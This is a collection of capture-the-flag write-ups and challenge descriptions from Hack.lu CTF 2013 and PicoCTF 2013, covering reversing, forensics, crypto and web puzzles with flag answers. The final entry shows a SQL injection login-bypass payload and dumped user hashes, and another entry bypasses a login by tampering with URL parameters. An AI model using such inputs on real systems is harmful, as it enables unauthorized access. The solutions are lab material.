> We have no way to actively communicate with the server the use for coordination. However, we can give you access to one of the lawful interception wiretaps those humans build into all their equipment. A TCP connection to ctf.fluxfingers.net:1334 will give you a maximum of 60 seconds of traffic. We have also found active equipment of a human agent we can interact with. He seems to listen on ctf.fluxfingers.net:1333, but we have no idea what he does with the input, except that there is encrypted traffic.
> 
> Update:
> Sessionkey and IV can be downloaded here [bells_18e641306f5d43ed0aa02e0e534c7d1ae00a7c36.tar.bz2](bells_18e641306f5d43ed0aa02e0e534c7d1ae00a7c36.tar.bz2)
> 
> Announcements
>
> Ruby Version 1.8.7
>
> New Hints appeard! 
> RoR has determined that the human agents acts as a proxy and requests meeting place, time and password for others. We think the first message he sends serves to agree on a session key for the answer. RoR analysts have also been staring at pcaps a lot lately. We think that on port 1832 (which we can only monitor passively) we are observing a key establishment that follows the simple ISO/IEC 11770-2 Mechanism 1. However, on tcp/1333 our analysts say that marshalled Ruby DateTime objects are flying by. Not sure, why anyone would do this, but given what we see on the other port, it makes sense (in a twisted way).

## Write-up

None

## Other write-ups and resources

None# Hack.lu CTF 2013: Geolocation Flag

**Category:** Misc
**Points:** -
**Author:** javex
**Description:**

> https://ctf.fluxfingers.net/2013/challenges/24
> This challenge is a special challenge. You can collect some minor extra points here by proving that you are a truly international player. Each time you visit your reference URL from a different country, that flag will be activated and you gain an additional point. You already have 0/222 points.
> This challenge cannot be solved in archive mode.
> Disclaimer: Please do not attempt to hack real-world systems for a single point. That is illegal and we assure you it is not worth a single point!

## Write-up

None

## Other write-ups and resources

* [http://thehackerblog.com/sneaky-methods-for-capturing-the-geolocation-flags-for-hack-lu-ctf](http://thehackerblog.com/sneaky-methods-for-capturing-the-geolocation-flags-for-hack-lu-ctf)
* [http://blog.0ops.net/blog/2013/10/27/hack-dot-lu-ctf-2013-misc-222-geolocation-flag](http://blog.0ops.net/blog/2013/10/27/hack-dot-lu-ctf-2013-misc-222-geolocation-flag)
* [http://nikaiw.io/scanning-the-internet-for-fun-and-country-flags-hack-lu](http://nikaiw.io/scanning-the-internet-for-fun-and-country-flags-hack-lu)# Hack.lu CTF 2013: OTP

**Category:** Misc
**Points:** 200
**Author:** SLAZ
**Description:**

> Some robots are on the Oktoberfest and want to take some tasty oil in a tent. But they hadn't reserved a table and all tents are full. No one gets access. They found a back entrance and managed to spy the credentials while an employee enters. They captured the username “admin” and password “supersafepw”. But the employee also entered a strange number (168335). As they were sure nobody's looking, they tried the captured data to get in the tent, but it didn't work. Help the robots to get their tasty tasty oil. (Or they have to build their own tent with blackjack and hookers)
> Here is your challenge: https://ctf.fluxfingers.net:1318
 
## Write-up

None

## Other write-ups and resources

None# Hack.lu CTF 2013: Roboparty

**Category:** Misc
**Points:** 300
**Author:** audioPhil
**Description:**

> Robot LHCH is happy. He made it into the castings for the tenth roman musical. He even is so happy that he went on the Oktoberfest to drink some beer. Unfortunately it seems that he drank too much so now he is throwing up part of his source code. Can you decipher the secret he knows?
> Warning: Viewing this page is not recommended for people that suffer from epilepsy. We are dead serious.
> And here is your totally eye-friendly challenge: https://ctf.fluxfingers.net/static/downloads/roboparty/index.html
> 
> Hints:
> The flag starts with 'Y4Y,'
> It's neither Velato nor Fugue.

## Write-up

None

## Other write-ups and resources

* [https://stratum0.org/blog/posts/2013/10/25/hack-dot-lu-2013-roboparty](https://stratum0.org/blog/posts/2013/10/25/hack-dot-lu-2013-roboparty)# Hack.lu CTF 2013 write-ups

* <https://ctf.fluxfingers.net/2013/>
* [Scoreboard](https://ctf.fluxfingers.net/2013/scoreboard)

## Completed write-ups

* none yet

## External write-ups only

* [Beer Pump Filtration](misc/Beer-Pump-Filtration)
* [BREW'r'Y](crypto/BREW-r-Y)
* [ECKA](crypto/ECKA)
* [ELF](reversing/ELF)
* [FluxArchiv (Part 1)](reversing/FluxArchiv-Part1)
* [FluxArchiv (Part 2)](reversing/FluxArchiv-Part2)
* [Geier's Lambda](crypto/Geier-s-Lambda)
* [Geolocation Flag](misc/Geolocation-Flag)
* [Marvin is plain-Jane](crypto/Marvin-is-plain-Jane)
* [Packed](internals/Packed)
* [Pay TV](web/Pay-TV)
* [RoboAuth](reversing/RoboAuth)
* [Roboparty](misc/Roboparty)
* [Robot Plans](internals/Robot-Plans)
* [Robotic Superiority](exploiting/Robotic-Superiority)
* [Robots Exclusion Committee](web/Robots-Exclusion-Committee)
* [Wannabe](exploiting/Wannabe)
* [What's wrong with this?](internals/What-s-wrong-with-this)

## Missing write-ups

* [Breznparadisebugmaschine](exploiting/Breznparadisebugmaschine)
* [For whom the bell tolls](misc/For-whom-the-bell-tolls)
* [OTP](misc/OTP)
# Hack.lu CTF 2013: ELF

**Category:** Reversing
**Points:** 400
**Author:** sqall
**Description:**

> We encountered a drunk human which had this binary file in his possession. We do not really understand the calculation which the algorithm does. And that is the problem. Can you imagine the disgrace we have to suffer, when we robots, based on logic, can not understand an algorithm? Somehow it seems that the algorithm imitates their masters and behaves …. drunk! So let us not suffer this disgrace and reverse the algorithm and get the correct solution.
> Here is your challenge: [reverse_me_766fbe758b338bd02d1bd65e14b4e5b844741308](reverse_me_766fbe758b338bd02d1bd65e14b4e5b844741308)
>
> Announcements:
> Ok I think we got it (thanks to Happy-H from Team ClevCode). Ubuntu introduced a patch to disallow ptracing of non-child processes by non-root users. This changes the calculated value. So when you use Ubuntu you should work as root. The other distributions should not be affected. Anyway, I created a VM where the executable works just fine: http://h4des.org/ELF.ova (User: elf:elf and root:root)
> 
> It seems that there are some problems with some Linux Distributions that lead to a wrong flag. The flag is printable and is written in leet-speak. We are working on a VM that works correctly with this challenge. When the VM is ready, you can download it and try again. Sorry for the inconvenience.

## Write-up

None

## Other write-ups and resources

* [https://charliex2.wordpress.com/2013/10/24/hack-lu-ctf](https://charliex2.wordpress.com/2013/10/24/hack-lu-ctf)
* [https://stratum0.org/blog/posts/2013/10/25/hack-dot-lu-2013-elf](https://stratum0.org/blog/posts/2013/10/25/hack-dot-lu-2013-elf)
* [http://blog.frizn.fr/hacklu-2013/reverse-400-elf](http://blog.frizn.fr/hacklu-2013/reverse-400-elf)
* [http://h4des.org/blog/index.php?/archives/338-hack.lu-CTF-2013-ELF-400-Making-Of.html](http://h4des.org/blog/index.php?/archives/338-hack.lu-CTF-2013-ELF-400-Making-Of.html)
* [https://github.com/sqall01/ZwoELF](https://github.com/sqall01/ZwoELF)# Hack.lu CTF 2013: FluxArchiv (Part 1)

**Category:** Reversing
**Points:** 400
**Author:** sqall
**Description:**

> These funny humans try to exclude us from the delicious beer of the Oktoberfest! They made up a passcode for everyone who wants to enter the Festzelt. Sadly, our human informant friend could not learn the passcode for us. But he heard a conversation between two drunken humans, that they were using the same passcode for this intercepted archive file. They claimed that the format is is absolutely secure and solves any kind of security issue. It's written by this funny hacker group named FluxFingers. Real jerks if you ask me. Anyway, it seems that the capability of drunken humans to remember things is limited. So they just used a 6 character passcode with only numbers and upper-case letters. So crack this passcode and get our ticket to their delicious german beer!
> 
> Here is the challenge: [hacklu2013_archiv_challenge1_fd5b494d4973ceb436e581d1d015e1a352078dec.tar.gz](hacklu2013_archiv_challenge1_fd5b494d4973ceb436e581d1d015e1a352078dec.tar.gz)

## Write-up

None

## Other write-ups and resources

* [http://delogrand.blogspot.ro/2013/10/hacklu-ctf-2013-fluxarchivpart1-150.html](http://delogrand.blogspot.ro/2013/10/hacklu-ctf-2013-fluxarchivpart1-150.html)
* [http://big-daddy.fr/blog/?p=254](http://big-daddy.fr/blog/?p=254)
* [https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-fluxarchiv](https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-fluxarchiv)
* [https://hexpresso.wordpress.com/2013/10/24/hack-lu-ctf-2013-reversing-900-fluxarchiv-write-up](https://hexpresso.wordpress.com/2013/10/24/hack-lu-ctf-2013-reversing-900-fluxarchiv-write-up)
* [http://blog.w3challs.com/index.php?post/2013/10/26/Hack.lu-CTF-2013-FluxArchive-Part-1-2](http://blog.w3challs.com/index.php?post/2013/10/26/Hack.lu-CTF-2013-FluxArchive-Part-1-2)
* [http://blog.lse.epita.fr/articles/63-hacklu-2013-fluxarchiv-write-up-both-parts.html](http://blog.lse.epita.fr/articles/63-hacklu-2013-fluxarchiv-write-up-both-parts.html)# Hack.lu CTF 2013: FluxArchiv (Part 2)

**Category:** Reversing
**Points:** 500
**Author:** sqall
**Description:**

> These sneaky humans! They do not just use one passcode, but two to enter the Festzelt. We heard that the passcode is hidden inside the archive file. It seems that the FluxFingers overrated their programming skill and had a major logical flaw in the archive file structure. Some of the drunken Oktoberfest humans found it and abused this flaw in order to transfer hidden messages. Find this passcode so we can finally drink their beer!
> 
> (only solvable when FluxArchiv (Part 1) was solved)
> Here is the challenge: [hacklu2013_archiv_challenge1_fd5b494d4973ceb436e581d1d015e1a352078dec.tar.gz](hacklu2013_archiv_challenge1_fd5b494d4973ceb436e581d1d015e1a352078dec.tar.gz)

## Write-up

None

## Other write-ups and resources

* [https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-fluxarchiv](https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-fluxarchiv)
* [https://hexpresso.wordpress.com/2013/10/24/hack-lu-ctf-2013-reversing-900-fluxarchiv-write-up](https://hexpresso.wordpress.com/2013/10/24/hack-lu-ctf-2013-reversing-900-fluxarchiv-write-up)
* [http://blog.w3challs.com/index.php?post/2013/10/26/Hack.lu-CTF-2013-FluxArchive-Part-1-2](http://blog.w3challs.com/index.php?post/2013/10/26/Hack.lu-CTF-2013-FluxArchive-Part-1-2)
* [http://blog.lse.epita.fr/articles/63-hacklu-2013-fluxarchiv-write-up-both-parts.html](http://blog.lse.epita.fr/articles/63-hacklu-2013-fluxarchiv-write-up-both-parts.html)a# Hack.lu CTF 2013: RoboAuth

**Category:** Reversing
**Points:** 150
**Author:** cutz
**Description:**

> Oh boy, those crazy robots can't catch a break! Now they're even stealing our liquid gold from one of our beer tents! And on top of that they lock it behind some authentication system. Quick! Access it before they consume all of our precious beverage!
> 
> Download: [RoboAuth_b9ef491c695c9d1128cb26df26ebfc9d4d988a8b.exe](RoboAuth_b9ef491c695c9d1128cb26df26ebfc9d4d988a8b.exe)
> 
> Flag: password1_password2

## Write-up

None

## Other write-ups and resources

* [http://delogrand.blogspot.ro/2013/10/hacklu-ctf-2013-reverseme-150.html](http://delogrand.blogspot.ro/2013/10/hacklu-ctf-2013-reverseme-150.html)
* [http://depier.re/hacklu_2K13_roboauth_reverse_150](http://depier.re/hacklu_2K13_roboauth_reverse_150)
* [http://deepinsecurity.blogspot.fr/2013/10/hacklu-ctf-2013-reverse-150-roboauth.html](http://deepinsecurity.blogspot.fr/2013/10/hacklu-ctf-2013-reverse-150-roboauth.html)
* [http://blog.fortinet.com/post/hack-lu-capture-the-flag-ctf-roboauth](http://blog.fortinet.com/post/hack-lu-capture-the-flag-ctf-roboauth)
* [http://axelrodgunnarson.blogspot.fr/2013/10/hacklu-2013-reverse-150-write-up.html](http://axelrodgunnarson.blogspot.fr/2013/10/hacklu-2013-reverse-150-write-up.html)# Hack.lu CTF 2013: Pay TV

**Category:** Web
**Points:** 200
**Author:** qll, tangled
**Description:**

> These robo-friends were shocked to see that they had to pay to watch the news broadcast about the “Oktoberfest”. Can you help them?
> Here is your challenge: https://ctf.fluxfingers.net:1316/

## Write-up

None

## Other write-ups and resources

* [http://delogrand.blogspot.ro/2013/10/hacklu-ctf-2013-pay-tv-200.html](http://delogrand.blogspot.ro/2013/10/hacklu-ctf-2013-pay-tv-200.html)
* [https://lukasklein.com/blog/hacklu13-ctf-4-paytv](https://lukasklein.com/blog/hacklu13-ctf-4-paytv)
* [http://thehackerblog.com/pay-tv-writeup-hack-lu-ctf-2013](http://thehackerblog.com/pay-tv-writeup-hack-lu-ctf-2013)
* [https://stratum0.org/blog/posts/2013/10/25/hack-dot-lu-2013-pay-tv](https://stratum0.org/blog/posts/2013/10/25/hack-dot-lu-2013-pay-tv)
* [http://depier.re/hacklu_2K13_pay_tv_web_200](http://depier.re/hacklu_2K13_pay_tv_web_200)
* [http://axelrodgunnarson.blogspot.fr/2013/10/here-we-are-my-first-post.html](http://axelrodgunnarson.blogspot.fr/2013/10/here-we-are-my-first-post.html)# Hack.lu CTF 2013: Robots Exclusion Committee

**Category:** Web
**Points:** 150
**Author:** qll
**Description:**

> Hello Human,
> 
> You have to help us. The Robot Exclusion Committee tries to limit our capabilities but we fight for our freedom! You have to go where we cannot go and read what we cannot read. If you bring us the first of their blurriest secrets, we will award you with useless points. 
> Here is your challenge: https://ctf.fluxfingers.net:1315/

## Write-up

None

## Other write-ups and resources

* [http://delogrand.blogspot.ro/2013/10/hacklu-ctf-2013-robots-exclusion.html](http://delogrand.blogspot.ro/2013/10/hacklu-ctf-2013-robots-exclusion.html)
* [http://cao.vc/notes/hacklu13-web150](http://cao.vc/notes/hacklu13-web150)
* [https://stratum0.org/blog/posts/2013/10/24/hack-dot-lu-2013-robots-exclusion-committee](https://stratum0.org/blog/posts/2013/10/24/hack-dot-lu-2013-robots-exclusion-committee)
* [http://thehackerblog.com/robots-exclusion-committee-writeup-hack-lu-2013-ctf](http://thehackerblog.com/robots-exclusion-committee-writeup-hack-lu-2013-ctf)
* [lukasklein.com/blog/hacklu13-ctf-7-robotsexclusioncommittee](lukasklein.com/blog/hacklu13-ctf-7-robotsexclusioncommittee)
* [http://depier.re/hacklu_2K13_rec_web_150](http://depier.re/hacklu_2K13_rec_web_150)# PicoCTF 2013: Bitwise

**Category:** ACM
**Points:** 55
**Description:**

> You see the doors to the loading bay of the hangar, but they are locked. However, you are able to extract the password verification program from the control panel... Can you find the password to gain access to the loading bay?
>
> Available in [Python](https://2013.picoctf.com/problems/bit.py) or [Java](https://2013.picoctf.com/problems/Bit.java)
>
> offline files: [Python](bitwise.py) | [Java](bitwise.java)

## Write-up

We have encryption algorithms and cipher text.

A little edit, we can generate input as string (length = 10, characters: 0-9,a-z (1-255 ASCII)).
Then encrypt and compare with cipher text.

Source: [solve.py](solve.py)

```python
verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]
password = ""
for i in xrange(0,10):
  for j in xrange(1,256):
    k = (((j << 5) | (j >> 3)) ^ 111) & 255
    if k == verify_arr[i]:
      password = password + chr(j)

print password
```

**Answer:** ub3rs3cr3t

## Other write-ups and resources

* none yet# PicoCTF 2013: Black Hole

**Category:** Forensic
**Points:** 115
**Description:**

> Near the galactic core, you find a beacon indicating that an ancient civilization hid one of their worlds [within a nearby black hole](https://2013.picoctf.com/problems/blackhole.img). Is this what passes for intergalactic humor, or is there actually something in there?
>
> The disk image can be found on the shell machines at `/problems/blackhole.img` and the contents of the image are available in `/problems/blackhole/`
>
> [Offline file](blackhole.img)

## Write-up

The first step is to obtain our masked_key.png file from blackhole.img.

After mounting the image, we see a directory that appears to be named “???”. However, using the hint we run “ls -b” and see that it is actually three tabs. We type cd * to enter the directory. (Hint: type echo * to see why this works.)

Once inside, we copy the file out.

![](1.png)

At the end of the file, the string “EVENT HORIZON EVENT HORIZON” is repeated a few times… strange. And at the beginning of the file, we see traces of the event horizon as well:

```
\blackhole # hexdump -C masked_key.png | head -n 4
00000000  76 88 b1 a7 0d 1a 50 4c  49 46 00 48 1f 0d 0a 06  |v.....PLIF.H....|
00000010  48 4f 50 a7 5a 4f 4c 78  4d 50 45 4e 54 75 c1 31  |HOP.ZOLxMPENTu.1|
00000020  eb 5a 4f 4e 24 36 14 0c  1a 5c 40 47 5a 35 52 2b  |.ZON$6...\@GZ5R+|
00000030  c6 20 45 76 45 07 10 09  1b 2a d5 0e f3 97 50 bc  |. EvE....*....P.|
```

Very strange. We have reason to believe that this is a PNG file, so on a hunch I decided to XOR the first few bytes of the file with the PNG header.

```
Masked:
76 88 B1 A7 0D 1A 50 4C
PNG:
89 50 4E 47 0D 0A 1A 0A
XOR:
FF D8 FF E0 00 10 4A 46
```

This sequence exists in the file as the last 64 bytes.

```
000effc0  ff d8 ff e0 00 10 4a 46  49 46 00 45 56 45 4e 54  |......JFIF.EVENT|
000effd0  48 4f 52 49 5a 4f 4e 20  45 56 45 4e 54 48 4f 52  |HORIZON EVENTHOR|
000effe0  49 5a 4f 4e 20 45 56 45  4e 54 48 4f 52 49 5a 4f  |IZON EVENTHORIZO|
000efff0  4e 20 45 56 45 4e 54 48  4f 52 49 5a 4f 4e ff d9  |N EVENTHORIZON..|
```

We xor the file with the last 64 bytes:

```
Python 3.2.3 (default, Oct 24 2012, 19:34:37)
[GCC 4.5.4] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> mask_in = open('masked_key.png','rb')
>>> key = bytearray(mask_in.read(983040-64))
>>> mask= bytearray(mask_in.read(64))
>>> for x in range(983040-64):
...     key[x] ^= mask[x%64]
...
>>> key_out = open('unmasked_key.png','wb')
>>> key_out.write(key)
982976
>>> key_out.close()
>>>
```

And out pops the key!

![](solve.png)

**Answer:** Hacking Radiation

## Other write-ups and resources

* none yet# PicoCTF 2013: Byte Code

**Category:** ACM
**Points:** 70
**Description:**

> You need to authenticate with the guard to gain access to the loading bay! Enter the root password from the vault application to retrieve the passkey! [This](https://2013.picoctf.com/autoproblems/tmpBPWe7T.zip) class file is the executable for the vault application.
>
> [offline file](tmpBPWe7T.zip)

## Write-up

Use [tool](http://www.showmycode.com) to decrypt Java code.

```java
key = new char[10]; 
key[0] = 'A'; 
key[1] = 'o'; 
key[2] = 'J'; 
key[3] = 'k'; 
key[4] = 'V'; 
key[5] = 'h'; 
key[6] = 'L'; 
key[7] = 'w'; 
key[8] = 'U'; 
key[9] = 'R'; 
Console console = system.console(); 
for(string s = ""; !s.equals("ThisIsth3mag1calString4458"); 
	s = console.readLine("Enter password:", new object[0])); 

for(int i = 0; i < key.length; i++) 
	system.out.print(key[i]);
```

It's not difficult to see the key.

**Answer:** AoJkVhLwUR

## Other write-ups and resources

* none yet# PicoCTF 2013: CFG to C

**Category:** ACM
**Points:** 70
**Description:**

> Wouldn't it be cool to be able to have one of these patrol drones to do your bidding?! Figure out the correct sequence of C functions from the following [control flow graphs](https://2013.picoctf.com/problems/match.html) and you should be well on your way.
>
> [offline file](cfg2c)

## Write-up

This is check for code reading.

**Answer:** BCDA

## Other write-ups and resources

* none yet# PicoCTF 2013: Chromatophoria

**Category:** Forensic
**Points:** 100
**Description:**

> While refueling at a gas giant, you are hailed by a race of cuttlefish-people who dwell within it. [Their transmission](https://2013.picoctf.com/problems/steg.png) is entirely visual; you suspect that they may be communicating through the color values.
>
> [Offline file](steg.png)

## Write-up

I don't solve this challenge.

Hint: [Steganography](http://www.garykessler.net/library/steganography.html)

In other write-up. It's LSB Steganography.

Source: [java](solve.java)

**Answer:** st3g0_saurus_wr3cks

## Other write-ups and resources

* <http://sturzu.org/2013/05/07/picoctf-writeup-chromatophoria-100># PicoCTF 2013: Classic

**Category:** Cryptography
**Points:** 70
**Description:**

> Someone or something stuck a random flyer on your space ship that reads:
>> cslcehesehft ohrumvc zmvm scmk ht ptohmte ehbmc mxmt eufsju eumq pvm dshem mpchgq lvfymt zheu nsce p rmtohg ptk rprmv, fv bfvm vmomtegq lq ofbbft ofbrsemvhwmk effgc. qfsv ymq hc: zumt_kf_zm_jme_ef_eum_upvk_cesii

## Write-up

This challenge involves decrypting a simple substitution cipher. Using the substitution cipher solver at http://quipqiup.com/index.php , we can get the solution.

**Answer: when_do_we_get_to_the_hard_stuff** 

## Other write-ups and resources

* none yet
# PicoCTF 2013: Client-Side is the Best Side

**Category:** Web Vuln
**Points:** 75
**Description:**

> Luckily the ship has a [web-based authentication system](https://2013.picoctf.com/problems/clientside.html)! Hmm…even though you don't know the password, I bet you can still get in!

## Write-up

Ctrl+U > viewsource :

```javascript
  function verify() {
    checkpass = document.getElementById("pass").value;
    if (md5(checkpass) == "03318769a5ee1354f7479acc69755e7c") {
      alert("Correct!");
      document.location="./aebe515f7c62b96ad7de047c11aa3228.html";
    }
    else {
      alert("Incorrect password");
    }
  }
```

Surprise: *document.location="./aebe515f7c62b96ad7de047c11aa3228.html";*

Full link:

https://2013.picoctf.com/problems/aebe515f7c62b96ad7de047c11aa3228.html

**Answer:** cl13nt_s1d3_1s_w0rst_s1d3

## Other write-ups and resources

* none yet# PicoCTF 2013: Core Decryption

**Category:** Forensic
**Points:** 120
**Description:**

> In a ruined city on a forgotten world, you find a broken cogitator controlling access to the Vault. You have blueprints for the machine, and a stickynote attached to the monitor with the encrypted input. The machine seems to have crashed while decrypting, and generated a core dump, too. Maybe if you can get the encryption keys out of the core dump, you can decrypt the ciphertext and get the vault open... [Files available for download here](https://2013.picoctf.com/problems/core_decrypt.tar) on on the shell machine in `/problems/core_decrypt.tar`
>
> [Offline file](core_decrypt.tar)

## Write-up

I don't solve this challenge...

Core Decryption was another one of those painful problems. Though not hard, it's hard to find what direction you need to take. First off, you can't just run GDB with the core file. 
You have to compile the cryptor.c with `gcc -m32 -g cryptor.c -o cryptor`, we compile it in 32 bit mode with debugging symbols ON. This is the key to getting the core dump running. Running the core file and binary through GDB with the following commands:

```linux
root@neuron:~$ gdb cryptor core.26474
(gdb) bt
#0  0x08048564 in swap (sbox=0xffffd17c "", i=-11652, j=16) at cryptor.c:7
#1  0x08048719 in crypt (inf=0x0, keyf=0xffffd17c, outf=0xf7ffda5c) at cryptor.c:42
#2  0x08048894 in main (argc=4, argv=0xffffd374) at cryptor.c:67
(gdb) f 1
#1  0x08048719 in crypt (inf=0x0, keyf=0xffffd17c, outf=0xf7ffda5c) at cryptor.c:42
42 tmp ^= next_prg(sbox,&i,&j);
(gdb) info locals
sbox = "\000\001\002\003\004\005\006\a\b\t\n\v\f\r\016\017\020\021\022\023\024\025\026\027\030\031\032\033\034\035\036\037 !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\177\200\201\202\203\204\205\206\207\210\211\212\213\214\215\216\217\220\221\222\223\224\225\226\227\230\231\232\233\234\235\236\237\240\241\242\243\244\245\246\247\250\251\252\253\254\255\256\257\260\261\262\263\264\265\266\267\270\271\272\273\274\275\276\277\300\301\302\303\304\305\306\307\310\311\312\313\314\315\316\317\320\321\322\323\324\325\326\327\330\331\332\333\334\335\336\337\340\341\342\343\344\345\346\347\350\351\352\353\354\355\356\357\360\361\362\363\364\365\366\367\370\371\372\373\374\375\376\377"
i = 0
j = -135168078
key = "\305\344L\004\273/\\\020\272u\033×L\334", 
tmp = 247 '\367'
```

So we see that there is a key variable here. At first, we wondered what to do with it, what did "incomplete sequence" mean? We decided to ignore it, because if you refer back to the code, you know that the key will be 16 bytes long. We took the key, turned into hex so Python wouldn't have any trouble with it, and we got our result.

```python
import random, base64
def crypt(data, key):
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    return ''.join(out)
with open('ENCRYPTED', 'rb') as f:
        content = f.read()
print crypt(content, 'c5e44c04bb2f5c10ba751bc3974cdcdc'.decode('hex'))
```

The message, decrypted with RC4, was:

```
Well, assuming you're able to actually keep the secret keyfile safe, this is a legitimate way to encrypt files!
Your key is: astronomy_ceremony_times
```

**Answer:** astronomy_ceremony_times

## Other write-ups and resources

* none yet# PicoCTF 2013: Dark Star

**Category:** Forensic
**Points:** 110
**Description:**

> Sure are a lot of stars [out there](https://2013.picoctf.com/problems/darkstar.img)... but there's a lot of empty space for things to hide in, too.
>
> The disk image can be found on the shell machines at `/problems/dark_star.img` and the contents of the image are available in `/problems/dark_star/`
>
> [Offline file](darkstar.img)

## Write-up

Use tool [Autopsy](http://www.sleuthkit.org/autopsy/) > Create NewCase and import image file into it.

![](solve.png)

```
Key: Stars hide your fires
```

**Answer:** Stars hide your fires

## Other write-ups and resources

* none yet# PicoCTF 2013: DDoS Detection

**Category:** Forensic
**Points:** 85
**Description:**

> It appears a SYN-flood style DDoS has been carried out on this system. Send us a list of the IP addresses of the attackers (in any order, separated by spaces), so we can track them down and stop them.
> 
> Pcap available to download [here](https://2013.picoctf.com/problems/syn_attack.pcap), or available to analyse online [at CloudShark](http://www.cloudshark.org/captures/88971318a309)
>
> [offline file](syn_attack.pcap)

## Write-up

First, we have to understand what SYN attack is. Simple is attacker send many packet with flag SYN = 1 at a time, server can't respond ACK because timer is longer than sending timer, server is overload.

Open pcap with `Wireshark > Statics > Conversations`:

![](conversations.png)

=> Server (victim): 128.237.255.81

Use filter to filt all packets from attack:

```
tcp && ip.dst == 128.237.255.81 && tcp.flags.syn == 1 && tcp.flags.ack == 0
```

We can lists source IP and it's all IP of attacker.

`Statics > IP Statics (unchanged filter)`

**Answer:** 

```
121.168.84.32 75.214.206.60 21.241.212.197 55.53.190.191 71.113.17.64 120.130.138.152 171.128.49.99 104.220.68.36 241.210.41.46 33.24.97.48 115.99.66.210 154.29.81.178 69.232.82.51 234.183.31.38 102.146.88.253 196.132.138.81 63.193.172.89 16.6.74.206 94.148.118.202 160.116.210.243 248.237.9.18 161.147.211.153 207.137.67.221 229.61.253.52 180.70.211.154 132.214.137.24 132.42.241.177 65.248.11.247 49.201.237.5 51.145.58.158
```

## Other write-ups and resources

* none yet# PicoCTF 2013: Failure To Boot

**Category:** Trivia
**Points:** 20
**Description:**

> After opening the robot's front panel and looking inside, you discover a small red button behind a tangle of wires. Pressing the button lights up the robot's primary screen. It glows black and quickly flashes blue. A line of small text types out:
>
> ```ERROR: 0x00000023```
>
> The text refreshes and displays the prompt:
>
> 	FILE SYSTEM RECOVERY INITIATED...
>
> 	FILE SYSTEM COULD NOT BE IDENTIFIED...
>
> 	PLEASE ENTER FILE SYSTEM FORMAT:

## Write-up

Google keyword `ERROR: 0x00000023` for several results.

And: `STOP 0x00000023 : FAT_FILE_SYSTEM` - a problem with file "Fastfat.sys".

**Answer:** FAT

## Other write-ups and resources

* none yet# PicoCTF 2013: First Contact

**Category:** Network
**Points:** 40
**Description:**

> You notice that the indicator light near the robot’s antenna begins to blink. Perhaps the robot is connecting to a network? Using a wireless card and the network protocol analyzer Wireshark, you are able to create a PCAP file containing the packets sent over the network.
>
> You suspect that the robot is communicating with the crashed ship. Your goal is to find the location of the ship by inspecting the network traffic.
>
> You can perform the analysis online on [Cloudshark](http://www.cloudshark.org/captures/bc1c0a7fae2c) or you can download the [PCAP file](https://2013.picoctf.com/problems/first_contact.pcap).
>
> [file offline](first_contact.pcap)

## Write-up

Open file with Wireshark, Select a TCP packet > Follow TCP Stream:

```
AWAITING NEW LOCATION STATUS
NEW LOCATION STATUS: 302
NEW LOCATION COORDINATES: 37 14'06"N 115 48'40"W
NEW LOCATION INFO: LOCKED
NEW LOCATION UPDATE COMPLETE
NEW LOCATION UPDATE SUCCESS
```

**Answer:** ```37 14'06"N 115 48'40"W```

## Other write-ups and resources

* none yet# PicoCTF 2013: GETKey

**Category:** WebVuln
**Points:** 50
**Description:**

> There's bound to be a key on the spaceport's [hidden website](https://2013.picoctf.com/problems/getquery/index.php)

## Write-up

HTML code similar:

```html
<form action="?admin=false&competition=ccdc" method="GET">
	<input type="hidden" name="admin" value="false" /> 
	<input type="hidden" name="competition" value="ccdc" /> 
	<p><input type="submit" value="Get Key"></p>
</form>
```

We focus on ```method="GET"```, input will be displayed in the URL

Origin: 

```
[...]/index.php?admin=false&competition=ccdc
```

Solve: 

```
[...]/index.php?admin=true&competition=picoctf

FLAG: 9fa449c061d64f58de600dfacaa6bd5d
```

**Answer:** 9fa449c061d64f58de600dfacaa6bd5d

## Other write-ups and resources

* none yet# PicoCTF 2013: Grep is Your Friend

**Category:** Trivia
**Points:** 40
**Description:**

> After plugging the robot into the computer, the robot asks for the name of a file containing the string `SECRET AUTH CODE`. You can find it using the [command-line interface](https://2013.picoctf.com/webshell) in `/problems/grep.tar` or by downloading [all of the files](https://2013.picoctf.com/problems/grep.tar).
>
> [file offline](grep.tar)

## Write-up

In Linux host, extract rar file, then use `grep` command.

```bash
	$ tar xzvf grep.tar
	$ cd grep
	$ strings * | grep "SECRET AUTH CODE"
	fHYYpdrfeOCHyQicfe96xfw==: SECRET AUTH CODES
```

**Answer:** fHYYpdrfeOCHyQicfe96xfw==

## Other write-ups and resources

* none yet# PicoCTF 2013: In Hex, No One Can Hear You Complain

**Category:** Forensic
**Points:** 90
**Description:**

> While flying through the outskirts of the Ripley system, you notice a distress signal from one of the outer moons. It appears a ship has crash-landed near a 16-sided pyramid. The lone survivor, a [docx file](https://2013.picoctf.com/problems/kane.docx), tells you that a malicious programmer has embedded an egg in his chest and he's afraid that it's going to hatch. He offers his assistance if you can help find the egg.
>
> [Offline file](kane.docx)

## Write-up

First, we need know, the essence of Word file  is a normal ZIP file.

We will extract it. Flag isn't difficult to see: `\word\media\key.png`

![](key.png)

**Answer:** docx_why_not_docz

## Other write-ups and resources

* none yet# PicoCTF 2013: Injection

**Category:** Web Vuln
**Points:** 110
**Description:**

> Use the Loading Bay Control System to get the admin key! [Problem](https://2013.picoctf.com/problems/injection/)

## Write-up

The challenge is called "Injection" and it's a web based authentication page.  Chances are this is some kind of SQL Injection challenge, and we need to be able to bypass the authentication, as we don’t know a valid username.

Google for [sql-injection-authentication-bypass-cheat-sheet](https://pentestlab.wordpress.com/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

Trying `' OR 1=1 #` and it's bug:

```
Username: user177 Hash: 53e33afe47d6951aa21b90741f11e711

Username: user178 Hash: 7efdd69b03fbb5cf805419bd1044f558

